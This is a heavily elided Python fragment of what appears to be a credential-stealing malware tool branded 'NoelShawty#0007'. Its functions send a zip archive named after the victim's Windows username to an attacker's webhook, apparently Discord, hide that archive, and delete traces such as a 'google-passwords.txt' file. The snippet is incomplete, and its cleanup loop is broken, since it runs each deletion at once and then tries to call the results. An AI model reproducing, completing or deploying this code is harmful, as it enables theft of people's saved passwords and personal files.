...
def main(webhook: str):
    ...
    embed = Embed(title="NoelShawty#0007", color=5639644)
    ...
    embed.set_footer(text="NoelShawty#0007 | Created by NoelShawty")
    ...
    _file = None
    _file = File(f'NoelShawty#0007{os.getenv("Username")}.zip')
...
def zipup():
    with ZipFile(f'NoelShawty#0007{os.getenv("Username")}.zip', 'w') as zipf:
    ...
    hide(f'NoelShawty#0007{os.getenv("Username")}.zip')
...
def cleanup():
    for clean in [os.remove("google-passwords.txt"),
                  ...
                  os.remove(f"NoelShawty#0007{os.getenv('Username')}.zip")]:
        try:
            clean()
        except Exception:
            pass
